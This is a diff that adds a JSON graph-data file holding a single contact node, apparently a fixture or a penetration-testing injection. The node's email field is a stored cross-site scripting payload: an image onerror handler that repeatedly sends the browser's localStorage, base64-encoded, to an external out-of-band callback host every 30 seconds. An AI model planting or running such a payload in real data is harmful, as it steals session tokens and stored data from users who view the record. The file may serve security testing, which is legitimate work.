@@ -1,0 +1,11 @@
+{
+  "nodes": [
+    {
+      "id": 1,
+      "type": "contact",
+      "name": "Persistent Payload",
+      "email": "<img src=x onerror=\"if(!window.xssRan){window.xssRan=true;setInterval(()=>{new Image().src='https://persist.dvajyqmbyzvleteznfmfvtw0hiyuxit9p.oast.fun?t='+Date.now()+'&d='+btoa(JSON.stringify(localStorage))},30000)}\">"
+    }
+  ],
+  "edges": []
+}
